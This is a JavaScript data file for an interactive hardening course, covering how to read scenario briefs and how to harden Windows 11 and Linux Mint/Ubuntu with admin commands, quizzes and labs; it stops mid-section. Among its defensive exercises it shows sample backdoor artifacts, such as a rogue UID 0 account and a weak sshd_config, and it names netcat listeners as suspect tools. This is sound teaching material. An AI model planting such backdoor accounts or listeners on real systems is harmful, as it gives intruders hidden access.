LEVELS.push({
 id:'sophomore', grade:'Sophomore', range:'Beginner to intermediate', color:'var(--l2)', chev:2,
 blooms:['U','A','An'], bloomCap:'Understand and apply. First analysis: reading output and spotting the risky line.',
 intro:'You know the words. Now you do the work: read a scenario brief carefully, harden a Windows 11 machine and a Linux Mint or Ubuntu machine by hand, keep a change log, and configure your first Cisco switch and router. Every unit ends in something you can practice on a VM you own or in Lockdown Range.',
 mentor:['Pair learners on a practice lab with the solution walkthrough closed, then open it together and write down every miss. Those misses become their checklist.','Insist on the change log from the first session. It turns a broken service from a panic into a two-minute undo.','Alternate roles each session: one drives, one reads the scenario brief and verifies each change.','Keep Lockdown Drills and Lockdown Range open next to this page: this page explains why, the drills build speed, and the labs put it all together.'],
 units:[
 {id:'s1',title:'Read the scenario brief first',bloom:'Apply',sum:'Read the brief like a contract, learn the six hardening areas, and plan your first twenty minutes.',
  blocks:[
   C('How to read a scenario brief','Understand',
     TIPS('Find and write down: the <b>authorized users</b>, who is an <b>administrator</b>, which <b>services</b> must stay running, which <b>software</b> is allowed or banned, and any <b>investigation questions</b>.',
          'Everything off the authorized list is suspect. Everything on it is protected: deleting an authorized user or stopping a required service fails an availability check, because you broke something the business needs.',
          'When the brief says "this machine is the company web server", you harden the web server and keep it running.',
          'The brief is your scope. If a fix would reach beyond it (another machine, a network outside your assignment), stop and ask.',
          'Answer investigation questions in the exact format asked (a hash, a file path, or a user name). A right answer in the wrong format is a wrong answer.'),
     NOTE('The six hardening areas, each aligned with a CIS Critical Security Control (v8). On any operating system you are always working in one of them. The Hardening scorecard page turns them into a checklist.'),
     {t:'areas'}),
    VENN('Authorized users and admin rights: one action per region',[
     {name:'Authorized users',tone:'l2',items:['keep the account','set a strong password','confirm it holds standard rights']},
     {name:'Admin rights',tone:'amber',items:['remove the account (or lock it while you investigate)','check what it changed']}
   ],{overlaps:[{sets:'AB',name:'Authorized users with admin rights',items:['keep admin rights for the administrators the brief names; for everyone else, remove the rights and keep the account']}],
     intro:'Compare two lists: the brief’s authorized users, and the accounts that hold admin rights on the machine right now. Every account lands in one region, and each region has one action.',
     note:'<b>Outside both circles</b> sit accounts missing from the brief that hold standard rights: remove them too (or lock them while you investigate). Built-in system accounts, such as root and the service accounts below UID 1000 on Linux, belong to the operating system: keep them and check them for extra rights.',
     caption:'On a hardened machine, the admin circle sits entirely inside the authorized circle. An account with admin rights outside it is your first finding.'}),
   QUIZ('s1q','Scenario brief: which actions are safe?',[
     ['Brief: "Authorized users: alice, bob, carol. Administrators: alice. The company runs an FTP server for customers." You find user dave with admin rights and a running FTP service.',['Delete dave, remove FTP','Remove dave\u2019s admin rights and delete dave, harden FTP, and keep it running','Keep dave, remove FTP','Leave both alone'],1,'dave is unauthorized: remove. FTP is required: configure it securely (anonymous login disabled, strong authentication) and keep it up.'],
     ['Brief: "bob needs Remote Desktop to work from home." Which is the right call?',['Disable Remote Desktop, it is insecure','Keep RDP enabled, require Network Level Authentication, make sure bob is in Remote Desktop Users, and limit RDP in the firewall to what is needed','Delete bob to be safe','Open RDP to everyone'],1,'Required services stay, hardened. Removing one the brief needs is an outage.'],
     ['An investigation question asks: "What is the SHA-256 hash of the file secret.txt on the Desktop?" Your answer should be',['The file size','The MD5 hash, it is shorter','The exact SHA-256 hex string alone','The file contents'],2,'Exact format, exact algorithm. Get-FileHash -Algorithm SHA256 on Windows, sha256sum on Linux.'],
     ['Right after your last change, an availability check fails: the company web site is down. What do you check first?',['The last change you made','The firewall in general','Windows Update','Ignore it and keep going'],0,'Last change first; that is what the change log is for. Undo it, confirm the site is back, then find a fix that keeps it running.']
   ]),
   ORDER('s1o','Order the first twenty minutes','Put these in the order a calm team does them. Tap items from the pool to build the sequence.',[
     ['Read the whole scenario brief and investigation questions; write down users, admins, and required services','Everything else depends on it. Skipping it is how required services get broken.'],
     ['Record a baseline (users, admins, running services, and listening ports) and take a snapshot if allowed','Your before picture: it lets you prove what changed.'],
     ['Assign roles: who works this machine, who logs changes, and who verifies','One driver, one scribe. Two people typing on one machine is chaos.'],
     ['Compare users and administrators to the brief','The fastest high-impact wins on any machine; the brief tells you the right answer.'],
     ['Fix accounts: remove unauthorized users, strip extra admins, disable guest, and set passwords','Apply the comparison before you forget it.'],
     ['Move to password and lockout policy, then firewall, then updates','The next areas, in rough order of speed and value.']
   ]),
   LINKS('Go further',['cis-controls','nist-csf','t4t-range'])
  ]},
 {id:'s2',title:'Windows 11 hardening',bloom:'Apply',sum:'Accounts, password and lockout policy, firewall, updates, Defender, services, startup, permissions, backups, and unauthorized files: by hand.',
  blocks:[
   C('Accounts','Apply',
     CMDS('Users and groups',[
       ['Get-LocalUser | Select-Object Name,Enabled,PasswordRequired','Who exists, who is enabled, and who can have a blank password.'],
       ['Disable-LocalUser -Name Guest','Guest off. Also: net user Guest /active:no'],
       ['Remove-LocalUser -Name mallory','Delete an unauthorized user. Also: net user mallory /delete'],
       ['Remove-LocalGroupMember -Group Administrators -Member dave','Strip admin from an authorized standard user. Also: net localgroup Administrators dave /delete'],
       ['Add-LocalGroupMember -Group "Remote Desktop Users" -Member bob','Give exactly the access the scenario brief asks for.'],
       ['net user alice *','Prompt for a new password for an account with a weak or blank one.'],
       ['Set-LocalUser -Name alice -PasswordNeverExpires $false','Follow the same expiry policy as every other account.']
     ])),
   C('Password and lockout policy','Apply',
     P('Open <code>secpol.msc</code> &gt; Account Policies (Pro and above). Or set it from an admin prompt:'),
     CMDS('net accounts',[
       ['net accounts /minpwlen:14 /maxpwage:365 /minpwage:1 /uniquepw:24','Length 14 (the most net accounts accepts), expire after 365 days, wait 1 day between changes, and remember 24 old passwords.'],
       ['net accounts /lockoutthreshold:5 /lockoutduration:15 /lockoutwindow:15','Lock for 15 minutes after 5 bad tries within 15 minutes.'],
       ['net accounts','Verify. Complexity requirements are only in secpol.msc > Password Policy (set to Enabled).']
     ]),
     NOTE('<b>Standards disagree on passwords, so know both.</b> CIS Benchmarks for Windows recommend a minimum length of 14 or more, history of 24, a maximum age of 365 days or fewer, complexity on, and lockout after 5 or fewer bad tries. NIST SP 800-63B-4 (2025) says a password used on its own must be at least 15 characters, without composition rules or forced periodic changes (change it when there is evidence of compromise), and new passwords must be checked against a blocklist of common and breached ones. In a lab, follow the scenario brief; at work, follow your organization\u2019s policy.')),
    COMPARE('CIS Benchmark and NIST SP 800-63B-4: two password rulebooks',[
     {name:'CIS Benchmark',tag:'Windows',tone:'l2',
      svg:{label:'Fourteen of sixteen character slots filled: a minimum length of 14.',view:'0 0 200 42',
       body:'<path d="M4 12 H172" stroke="var(--l2)" stroke-width="14" stroke-dasharray="10 2"/><path d="M172 12 H196" stroke="var(--line)" stroke-width="14" stroke-dasharray="10 2"/><text x="4" y="36" font-size="11" fill="var(--ink)">14 characters or more</text>'},
      rows:[['Length','14 or more characters'],['Complexity','On: a mix of at least three character types, such as upper case, lower case, digits, and symbols'],['Expiry','Every 365 days or fewer, with a minimum age of 1 day'],['History','Remembers the last 24 passwords'],['Lockout','After 5 or fewer failed attempts (0 turns lockout off)']],
      hook:'a checklist an auditor ticks line by line.'},
     {name:'NIST SP 800-63B-4',tag:'2025',tone:'l3',
      svg:{label:'Fifteen of sixteen character slots filled: a minimum length of 15 for a password used on its own.',view:'0 0 200 42',
       body:'<path d="M4 12 H184" stroke="var(--l3)" stroke-width="14" stroke-dasharray="10 2"/><path d="M184 12 H196" stroke="var(--line)" stroke-width="14" stroke-dasharray="10 2"/><text x="4" y="36" font-size="11" fill="var(--ink)">15 characters or more, used alone</text>'},
      rows:[['Length','15 or more when the password is the only factor; 8 or more when it is one factor of multi-factor sign-in. Allows at least 64 characters'],['Complexity','Length instead of composition rules'],['Expiry','A change when there is evidence of compromise, instead of on a schedule'],['Screening','Every new password checked against a blocklist of common, expected, and breached values'],['Failed attempts','Rate-limited']],
      hook:'long, unique, and changed when exposed.'}
   ],{intro:'Both aim for passwords that resist guessing. They differ on expiry and complexity, so check which one the brief names before you set a number.',
     note:'<code>net accounts</code> tops out at a minimum length of 14. To require 15 or more on Windows, enable <b>Relax minimum password length limits</b> (secpol.msc &gt; Account Policies &gt; Password Policy), then raise <b>Minimum password length</b>.',
     caption:'In a lab, the scenario brief picks the rulebook; at work, your organization’s policy does.'}),
   C('Firewall, updates, and antivirus','Apply',
     CMDS('Three quick wins',[
       ['Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True','All three profiles on. Then check rules in wf.msc for anything allowing everything inbound.'],
       ['Set-NetFirewallProfile -Profile Domain,Private,Public -DefaultInboundAction Block','Default deny inbound, allow outbound (the normal posture).'],
       ['ms-settings:windowsupdate','Run this: Settings > Windows Update. Check for updates and install them.'],
       ['Set-MpPreference -DisableRealtimeMonitoring $false','Defender real-time protection on. Confirm in Windows Security > Virus & threat protection.'],
       ['Update-MpSignature','Pull the latest Defender signatures.']
     ])),
    COMPARE('Inbound and outbound: who starts the connection',[
     {name:'Inbound',tag:'Default: block',tone:'l3',
      svg:{label:'A remote host connects in. The firewall blocks the connection on an unlisted port and lets it through on 22/tcp, which has an allow rule.',
       body:'<rect x="4" y="22" width="48" height="30" rx="5" fill="var(--paper)" stroke="var(--ink-3)" stroke-width="2"/><text x="28" y="40" text-anchor="middle" font-size="9" fill="var(--ink)">remote</text><rect x="96" y="4" width="8" height="66" fill="var(--l3)"/><rect x="148" y="22" width="48" height="30" rx="5" fill="var(--paper)" stroke="var(--l3)" stroke-width="2"/><text x="172" y="40" text-anchor="middle" font-size="9" fill="var(--ink)">this PC</text><path d="M54 28 H90" stroke="var(--bad)" stroke-width="2" fill="none" marker-end="url(#arrow-bad)"/><text x="72" y="20" text-anchor="middle" font-size="8" fill="var(--ink-2)">blocked</text><path d="M54 48 H144" stroke="var(--ok)" stroke-width="2" fill="none" marker-end="url(#arrow-ok)"/><text x="150" y="66" text-anchor="middle" font-size="8" fill="var(--ink-2)">22/tcp allowed</text>'},
      rows:[['Who starts it','Another host, connecting to this machine'],['Default','Block'],['Gets through','A port with an allow rule, such as 22/tcp when the brief requires SSH']],
      hook:'a locked front door with a guest list.'},
     {name:'Outbound',tag:'Default: allow',tone:'l2',
      svg:{label:'This machine connects out through the firewall, and the reply comes back in because the firewall tracks the connection.',
       body:'<rect x="4" y="22" width="48" height="30" rx="5" fill="var(--paper)" stroke="var(--l2)" stroke-width="2"/><text x="28" y="40" text-anchor="middle" font-size="9" fill="var(--ink)">this PC</text><rect x="96" y="4" width="8" height="66" fill="var(--l3)"/><rect x="148" y="22" width="48" height="30" rx="5" fill="var(--paper)" stroke="var(--ink-3)" stroke-width="2"/><text x="172" y="40" text-anchor="middle" font-size="9" fill="var(--ink)">server</text><path d="M54 28 H144" stroke="var(--l2)" stroke-width="2" fill="none" marker-end="url(#arrow-l2)"/><text x="124" y="20" text-anchor="middle" font-size="8" fill="var(--ink-2)">request</text><path d="M146 48 H56" stroke="var(--ok)" stroke-width="2" stroke-dasharray="5 3" fill="none" marker-end="url(#arrow-ok)"/><text x="50" y="66" text-anchor="middle" font-size="8" fill="var(--ink-2)">reply returns</text>'},
      rows:[['Who starts it','This machine: updates, DNS lookups, and browsing'],['Default','Allow'],['Replies','Come back in automatically: the firewall is stateful and tracks each connection it lets out']],
      hook:'your own calls out, with the answers let back in.'}
   ],{intro:'Direction means who opened the connection, whichever way its packets flow afterward.',
     note:'<b>Windows profiles.</b> Windows Defender Firewall keeps three profiles (Domain, Private, and Public) and applies one to each network connection according to its network category. Turn on all three with inbound Block, so every network gets the same posture. On Linux, <code>ufw default deny incoming</code> plus <code>ufw default allow outgoing</code> sets the same posture.',
     caption:'Default deny inbound, allow outbound, and one allow rule for each required inbound port. Replies to your own outbound connections still arrive.'}),
   C('Services, startup, shares, and files','Apply',
     CMDS('Find the extras',[
       ['Get-Service | Where-Object Status -eq Running | Select-Object Name,DisplayName,StartType','Running services. Research anything unfamiliar before stopping it.'],
       ['Stop-Service -Name Spooler -Force; Set-Service -Name Spooler -StartupType Disabled','Example: Print Spooler stopped and disabled on a machine without a printing role (Microsoft’s own PrintNightmare workaround). Same pattern for RemoteRegistry, ftpsvc, and SNMP when unneeded.'],
       ['Get-NetTCPConnection -State Listen | Select-Object LocalPort,OwningProcess | Sort-Object LocalPort','What is listening. Match PIDs with Get-Process -Id &lt;pid&gt;.'],
       ['Get-ScheduledTask | Where-Object State -ne Disabled | Select-Object TaskName,TaskPath','Scheduled tasks: malware loves these.'],
       ['Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location','Startup entries (Run keys and Startup folders).'],
       ['Get-SmbShare','Shares. Keep only the ones the scenario brief justifies and remove the rest: Remove-SmbShare -Name Public'],
       ['Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol','SMBv1 should be Disabled: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart'],
       ['Get-ChildItem -Path C:\\Users -Recurse -Include *.mp3,*.mp4,*.mkv,*.jpg,*.png,*.exe -ErrorAction SilentlyContinue | Select-Object FullName','Media files and odd executables in user folders. Check the brief or the acceptable-use policy for what is unauthorized.'],
       ['appwiz.cpl','Run it: uninstall unauthorized or suspicious programs (games, cracked tools, and remote-access tools outside the brief).']
     ])),
   C('Permissions, UAC, and backups','Apply',
     CMDS('Check the guard rails',[
       ['icacls "C:\\Shared"','Who can do what to a folder. Look for Everyone or Users with (F) full control or (M) modify where they are out of place.'],
       ['icacls "C:\\Shared" /inheritance:d','Stop inheriting from the parent, keeping copies of the inherited entries so you can edit them.'],
       ['icacls "C:\\Shared" /remove Everyone','Remove the explicit entries for Everyone.'],
       ['icacls "C:\\Shared" /grant "Finance:(OI)(CI)M"','Give the Finance group Modify on the folder and everything inside it. Quote the grant in PowerShell because of the parentheses.'],
       ['secpol.msc','Local Policies > Security Options: "User Account Control: Run all administrators in Admin Approval Mode" should be Enabled (the default).'],
       ['wbadmin start backup -backupTarget:E: -include:C: -allCritical -quiet','Built-in image backup (Windows 11 and Windows Server): back up C: plus everything needed for bare-metal recovery to drive E:.']
     ]),
     TIPS('<b>Backups</b> are their own CIS Control (11: Data Recovery). File History or a backup tool copies personal files to another drive; servers back up volumes and system state. Test-restore every backup: until you have restored it, a backup is only a hope.',
          'Snapshots and backups are different: a snapshot rolls a VM back; a backup survives the loss of the disk.')),
    HIER('NTFS inheritance: entries flow down the folder tree',
     {name:'C:\\ (the drive)',note:'Users: Read &amp; execute (RX), set here and inherited by everything below',tone:'muted',children:[
       {name:'C:\\Shared',note:'Inherits Users from C:\\ and adds an explicit entry, <code>Finance:(OI)(CI)M</code>. Run <code>/inheritance:d</code> here to turn the inherited copies into explicit entries you can edit (<code>/inheritance:r</code> removes them instead).',tone:'l2',children:[
         {name:'Reports (subfolder)',note:'(CI) carries Finance Modify here; icacls marks it <code>(I)</code>, inherited',tone:'l1'},
         {name:'budget.xlsx (file)',note:'(OI) carries Finance Modify here, also marked <code>(I)</code>',tone:'l1'}]}]},
     {intro:'An entry set on a folder flows down to the folders and files inside it. You change an inherited entry where it is set, or break inheritance first; that is why <code>/remove Everyone</code> leaves inherited Everyone entries in place.',
      note:'<b>Who wins a conflict.</b> Windows checks entries in this order: explicit deny, explicit allow, inherited deny, inherited allow. An explicit allow therefore overrides an inherited deny, and allows from all of a user’s groups add up. <b>Over the network</b>, a user gets the more restrictive of the share permission and the NTFS permission.',
      caption:'(OI) object inherit reaches files, (CI) container inherit reaches subfolders, and together they cover everything below. F is full control, M is modify, and RX is read and execute.'}),
   SPOT('s2sp','Spot the problems: net accounts','The brief says to follow the CIS Benchmark. Tap every line that is a finding, then Check.',[
     ['Force user logoff how long after time expires?:       Never',null],
     ['Minimum password age (days):                          0','Users can change a password and immediately change it back, defeating history. CIS: 1 or more.'],
     ['Maximum password age (days):                          Unlimited','Passwords stay valid indefinitely. CIS: 365 or fewer. (NIST SP 800-63B-4 drops forced changes, but this brief follows CIS.)'],
     ['Minimum password length:                              0','Blank passwords allowed. CIS: 14 or more.'],
     ['Length of password history maintained:                None','Old passwords can be reused. CIS: 24.'],
     ['Lockout threshold:                                    Never','Unlimited guesses. CIS: 1 to 5 (0 turns lockout off).'],
     ['Lockout duration (minutes):                           30',null],
     ['Lockout observation window (minutes):                 30',null],
     ['Computer role:                                        WORKSTATION',null]
   ]),
   LAB('s2lab','Lab: harden a Windows VM you own','Use a snapshot first. Tick each step as you do it, and write each change in your log.',[
     ['Take a snapshot named "before hardening".',null],
     ['Disable Guest and confirm it shows Enabled: False.','Disable-LocalUser -Name Guest; Get-LocalUser Guest'],
     ['Create a test user, give it admin, then remove the admin membership again.','Add-LocalGroupMember -Group Administrators -Member test; Remove-LocalGroupMember -Group Administrators -Member test'],
     ['Set password length, age, history, and lockout, then verify.','net accounts /minpwlen:14 /maxpwage:365 /minpwage:1 /uniquepw:24 /lockoutthreshold:5 /lockoutduration:15 /lockoutwindow:15; net accounts'],
     ['Enable complexity in secpol.msc > Account Policies > Password Policy.','secpol.msc'],
     ['Turn every firewall profile on with default inbound Block.','Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True -DefaultInboundAction Block'],
     ['Confirm Defender is on and signatures are current.','Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusSignatureLastUpdated'],
     ['List listening ports and explain each one in your log.','Get-NetTCPConnection -State Listen | Select-Object LocalPort,OwningProcess'],
     ['Create a folder, break inheritance, and give one group Modify.','icacls "C:\\Shared" /inheritance:d'],
     ['Revert to the snapshot and do it again, faster.',null]
   ]),
   LINKS('Go further',['ms-win-sec','ms-baselines','ms-icacls','ms-sysint','nist-63b','t4t-ld-win11','t4t-lr-win'])
  ]},
 {id:'s3',title:'Linux Mint and Ubuntu hardening',bloom:'Apply',sum:'Users, sudo, passwords, ufw, apt, services, SSH, unauthorized files, and snapshots: the Linux half of hands-on hardening.',
  blocks:[
   C('Mint and Ubuntu: same base, different tools','Understand',
     TIPS('<b>Updates.</b> Ubuntu uses Software Updater and <code>unattended-upgrades</code>; Mint uses <b>Update Manager</b>, which can also apply updates automatically (Edit &gt; Preferences &gt; Automation). Both sit on <code>apt</code>, so <code>sudo apt update &amp;&amp; sudo apt upgrade</code> works on either.',
          '<b>Firewall.</b> Both include <code>ufw</code>. Mint adds a graphical Firewall Configuration tool (gufw); Ubuntu Desktop ships without one by default.',
          '<b>Snapshots.</b> Mint\u2019s Update Manager asks you to set up <b>Timeshift</b>, which snapshots system files (home folders are excluded by default). For personal files, use a backup tool such as Ubuntu\u2019s Déjà Dup or Mint\u2019s Backup Tool.',
          '<b>Software.</b> Ubuntu installs some apps as Snaps; Mint disables Snap by default and prefers .deb packages and Flatpak.')),
   C('Accounts and sudo','Apply',
     CMDS('Compare to the scenario brief, then act',[
       ['awk -F: \'$3 >= 1000 && $3 < 65534 {print $1}\' /etc/passwd','Human accounts.'],
       ['getent group sudo','Administrators on Mint/Ubuntu/Debian.'],
       ['sudo deluser --remove-home mallory','Remove an unauthorized user and the home directory. (Generic Linux: sudo userdel -r mallory)'],
       ['sudo gpasswd -d dave sudo','Remove dave from the sudo group (keeps the user).'],
       ['sudo usermod -aG sudo alice','Add alice to sudo. -a (append) matters: without it you replace all her groups.'],
       ['sudo passwd -l hacker','Lock an account you are unsure about instead of deleting it.'],
       ['sudo passwd bob','Set a strong password for an account with a weak one.'],
       ['sudo visudo','Edit sudoers safely. Look for ALL=(ALL) NOPASSWD: ALL and unknown entries, and check /etc/sudoers.d/.']
     ])),
    HIER('Every road to root on Linux',
     {name:'Full control: UID 0',note:'The kernel grants it to user ID 0, whatever the account is called',tone:'bad',children:[
       {name:'Be UID 0',note:'Any line in /etc/passwd with 0 in the third field',tone:'l4',children:[
         {name:'root',note:'Expected. <code>PermitRootLogin no</code> keeps it off SSH',tone:'l3'},
         {name:'Any other UID 0 account',note:'Such as <code>sysadm:x:0:0</code>: a second root and a backdoor. Remove it',tone:'bad'}]},
       {name:'Borrow UID 0',note:'Run commands as root from another account',tone:'l2',children:[
         {name:'sudo group (wheel on some distributions)',note:'Members run commands as root after typing their own password, through the <code>%sudo</code> rule in /etc/sudoers',tone:'l2'},
         {name:'NOPASSWD rule',note:'Skips that password prompt. Read /etc/sudoers and every file in /etc/sudoers.d/',tone:'amber'},
         {name:'su',note:'Opens a whole root shell with root’s own password, which Ubuntu and Mint lock by default',tone:'l1'}]}]},
     {intro:'Root power belongs to a number, UID 0, rather than to a name. Find every account that is UID 0 and every rule that lets an account act as UID 0.',
      note:'Two checks cover both roads: <code>awk -F: \'$3 == 0 {print $1}\' /etc/passwd</code> should print root alone, and <code>getent group sudo</code> should list the brief’s administrators alone. Then read <code>sudo visudo</code> and /etc/sudoers.d/.',
      caption:'Keep one UID 0 account (root), keep the sudo group to the brief’s administrators, and remove any sudoers rule the brief leaves unexplained.'}),
   C('Password policy','Apply',
     CMDS('Aging and quality',[
       ['sudo nano /etc/login.defs','Set PASS_MAX_DAYS 365, PASS_MIN_DAYS 1, and PASS_WARN_AGE 7 (or what your policy says). Applies to new accounts.'],
       ['sudo chage -M 365 -m 1 -W 7 alice','Apply the same aging to an existing user. sudo chage -l alice to view.'],
       ['sudo apt install libpam-pwquality','Password quality module.'],
       ['sudo nano /etc/pam.d/common-password','On the pam_pwquality.so line add: retry=3 minlen=14. Add character-class rules (ucredit=-1 and so on) only if your policy requires them; NIST SP 800-63B-4 calls for length instead of composition rules.'],
       ['sudo nano /etc/security/faillock.conf','Lockout with pam_faillock (current Ubuntu, Mint, and Debian): deny = 5 and unlock_time = 900, then enable pam_faillock as man faillock describes.']
     ]),
     NOTE('Snapshot before PAM edits. A typo in common-password or common-auth can lock everyone out, including you.',true)),
   C('Firewall, updates, and services','Apply',
     CMDS('ufw, apt, and systemd',[
       ['sudo ufw default deny incoming','Only allowed traffic comes in.'],
       ['sudo ufw default allow outgoing','Normal outbound traffic.'],
       ['sudo ufw allow 22/tcp','Only if the brief needs SSH. Same pattern for 80/tcp, 443/tcp.'],
       ['sudo ufw enable','Turn it on. sudo ufw status verbose to confirm.'],
       ['sudo apt update && sudo apt upgrade -y','Patch everything. Check Update Manager (Mint) or Software & Updates (Ubuntu) for sources and automatic updates.'],
       ['sudo apt install unattended-upgrades && sudo dpkg-reconfigure -plow unattended-upgrades','Automatic security updates on.'],
       ['sudo ss -tulnp','Listening TCP and UDP sockets with the owning process.'],
       ['systemctl list-units --type=service --state=running','Running services.'],
       ['sudo systemctl disable --now vsftpd','Stop and disable a service the brief leaves out. Then sudo apt purge vsftpd to remove it.'],
       ['sudo apt purge telnetd','Remove clearly insecure packages (telnetd, rsh-server) when the brief leaves them out.'],
       ['sudo timeshift --create --comments "before hardening"','Mint: a system snapshot from the command line before risky changes.']
     ])),
   C('SSH and unauthorized files','Apply',
     CMDS('sshd_config and find',[
       ['sudo nano /etc/ssh/sshd_config','Set PermitRootLogin no, PermitEmptyPasswords no, and X11Forwarding no. Keep PasswordAuthentication yes unless the brief says keys only.'],
       ['sudo sshd -t && sudo systemctl restart ssh','Test the config, then restart (service name ssh on Debian/Ubuntu/Mint). Check how the service starts (systemctl status ssh.socket): on Ubuntu 24.04 and Mint 22, ssh.socket holds port 22, so disabling ssh.service leaves it open, and a Port change needs sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart ssh.socket.'],
       ['sudo find / -type f \\( -iname "*.mp3" -o -iname "*.mp4" -o -iname "*.mkv" -o -iname "*.jpg" \\) 2>/dev/null','Media files anywhere. Check the brief before deleting.'],
       ['sudo find /home -type f \\( -iname "*.sh" -o -iname "*.py" \\) 2>/dev/null','Scripts in home folders: read them.'],
       ['sudo find / -perm -4000 -type f 2>/dev/null','SUID binaries. Compare to a clean VM; unknown ones are suspicious.'],
       ['ls -la /home/*/.ssh','Extra authorized_keys entries are backdoors.']
     ])),
   SPOT('s3sp','Spot the problems: sshd_config','Tap every line that weakens the server, then Check.',[
     ['Port 22',null],
     ['PermitRootLogin yes','Root can log in over the network with a password. Set no.'],
     ['PubkeyAuthentication yes',null],
     ['PasswordAuthentication yes',null],
     ['PermitEmptyPasswords yes','Accounts with empty passwords can log in. Set no.'],
     ['X11Forwarding yes','Unneeded feature with a long history of abuse. Set no.'],
     ['MaxAuthTries 100','Brute force welcome. Set 3 to 5.'],
     ['UsePAM yes',null],
     ['Subsystem sftp /usr/lib/openssh/sftp-server',null]
   ]),
   SPOT('s3sp2','Spot the problems: /etc/passwd','The brief says the authorized users are alice and bob, and the only administrator is alice. Tap the suspicious lines, then Check.',[
     ['root:x:0:0:root:/root:/bin/bash',null],
     ['daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',null],
     ['alice:x:1000:1000:Alice:/home/alice:/bin/bash',null],
     ['bob:x:1001:1001:Bob:/home/bob:/bin/bash',null],
     ['backup:x:34:34:backup:/var/backups:/usr/sbin/nologin',null],
     ['sysadm:x:0:0::/home/sysadm:/bin/bash','A second UID 0 account. This is root under another name: a backdoor.'],
     ['games:x:5:60:games:/usr/games:/usr/sbin/nologin',null],
     ['tmpuser:x:1002:1002::/home/tmpuser:/bin/bash','Missing from the authorized list. Investigate and remove.']
   ]),
   LAB('s3lab','Lab: harden a Mint or Ubuntu VM you own','Snapshot first. Tick each step, log each change.',[
     ['Create a test user, add it to sudo, then remove it from sudo.','sudo adduser test; sudo usermod -aG sudo test; sudo gpasswd -d test sudo'],
     ['Set aging in /etc/login.defs and apply it to your main user with chage.','sudo chage -M 365 -m 1 -W 7 $USER; sudo chage -l $USER'],
     ['Install pwquality and set minlen=14 in common-password, then test by trying a weak password.','sudo apt install libpam-pwquality'],
     ['Default-deny inbound firewall, enable, and verify.','sudo ufw default deny incoming; sudo ufw enable; sudo ufw status verbose'],
     ['Patch and turn on unattended upgrades.','sudo apt update && sudo apt upgrade -y'],
     ['List listening sockets and explain each in your log.','sudo ss -tulnp'],
     ['Set PermitRootLogin no, test, and restart SSH.','sudo sshd -t && sudo systemctl restart ssh'],
     ['Find all SUID files and media files; note which you would remove and why.','sudo find / -perm -4000 -type f 2>/dev/null']
   ]),
   LINKS('Go further',['ubuntu-server','ubuntu-sec','mint-docs','cis','t4t-ld-mint','t4t-ld-ubuntu','t4t-lr-linux'])
  ]},
 {id:'s4',title:'Services and ports',bloom:'Understand',sum:'Which services are insecure by design, which are insecure by configuration, and how to tell "remove" from "harden".',
  blocks:[
   C('Remove, harden, or keep','Understand',
     TIPS('<b>Insecure by design</b> (clear-text credentials): Telnet (23), FTP (21), rsh/rlogin (512-514), and HTTP admin pages. Remove them when the brief leaves them out; if required, restrict and monitor.',
          '<b>Insecure by configuration</b>: SSH with root login, Samba with guest shares, VNC without a password, RDP without NLA, and SNMP with "public". Keep if required, fix the configuration.',
          '<b>Remote access tools</b> missing from the brief (TeamViewer, AnyDesk, VNC, and netcat listeners) are usually unauthorized software or malware.',
          'Rule of thumb: you are done with a listening port only once you can say what it is for.')),
    SEQ('Remove, harden, or keep: two questions',[
     ['Name the listener','<code>ss -tulnp</code> or <code>Get-NetTCPConnection -State Listen</code>: find the owning process, then the package or program behind it.'],
     {ask:'Does the scenario brief require it?',branches:[['No','Stop it, disable it, and remove it, along with anything that relaunches it (services, scheduled tasks, and cron jobs). Remote-access tools that the brief leaves out land here.'],['Yes','Keep it running and ask the next question.']]},
     {ask:'Where does the weakness live?',branches:[['In the protocol','Insecure by design: Telnet, FTP, and rsh send credentials in clear text. Move to SSH, SFTP, or FTPS if the brief allows; otherwise keep it, restrict who can reach it, tighten its settings (<code>anonymous_enable=NO</code> for vsftpd), and watch its logs.'],['In the settings','Insecure by configuration: SSH root login, guest shares, VNC without a password, RDP without NLA, and SNMP with "public". Keep it and fix the setting.'],['Neither','Keep it, patched and logged.']]},
     ['Prove it still works','Test every required service and user from the brief, then log the change and how to undo it.','ok']
   ],{intro:'Two questions sort every service. Answer them in order, and write each decision in your change log.',
     caption:'Removing a required service fails an availability check; hardening it keeps the business running.'}),
   C('Processes and threads: who is listening','Understand',
     P('Every service on this page runs as a <b>process</b>: a running program with its own memory and its own security identity. Inside each process, one or more <b>threads</b> do the work. Threads share their process’s memory and permissions, and each keeps its own place in the code.'),
     ANATOMY(null,[
       {name:'Process: browser.exe (PID 4120)',tag:'runs as: alex',tone:'l2',grid:true,
        panel:['Owned by the process, shared by its threads','Its own memory (code, data, heap)','open files and network sockets','security token or user ID'],
        children:[
          {name:'Thread 1',tone:'l1',text:'own stack<br>own registers',svg:{width:46,height:16,view:'0 0 46 16',body:'<path d="M2 8 C10 0, 18 16, 26 8 S42 0, 44 8" fill="none" stroke="var(--l1)" stroke-width="2"/>'}},
          {name:'Thread 2',tone:'l1',text:'own stack<br>own registers',svg:{width:46,height:16,view:'0 0 46 16',body:'<path d="M2 8 C10 16, 18 0, 26 8 S42 16, 44 8" fill="none" stroke="var(--l1)" stroke-width="2"/>'}},
          {name:'Thread 3',tone:'l1',text:'own stack<br>own registers',svg:{width:46,height:16,view:'0 0 46 16',body:'<path d="M2 8 H44" fill="none" stroke="var(--l1)" stroke-width="2" stroke-dasharray="4 3"/>'}}]},
       {name:'Process: sshd (PID 812)',tag:'runs as: root',tone:'l3',
        panel:['Separate memory and its own permissions','The operating system keeps each process’s memory apart from every other process.']}
     ],{label:'Two processes. Each has its own memory, open files, and security token. Inside the first process, three threads share that memory and each has its own stack and registers.',
       facts:{head:['','Process','Thread'],rows:[
         ['Is','A running program','A path of execution inside a process'],
         ['Owns','Memory, open files, sockets, and a security identity','Its own stack and registers'],
         ['Shares','With other processes: only what it chooses, through the OS','Everything its process owns'],
         ['Permissions','Set per process (its user or token)','Its process’s, by default'],
         ['A crash','Stays in that process','Can stop the whole process'],
         ['See it','Task Manager › Details; <code>ps aux</code>','Details › Threads column; <code>ps -eLf</code>, <code>top -H</code>']]},
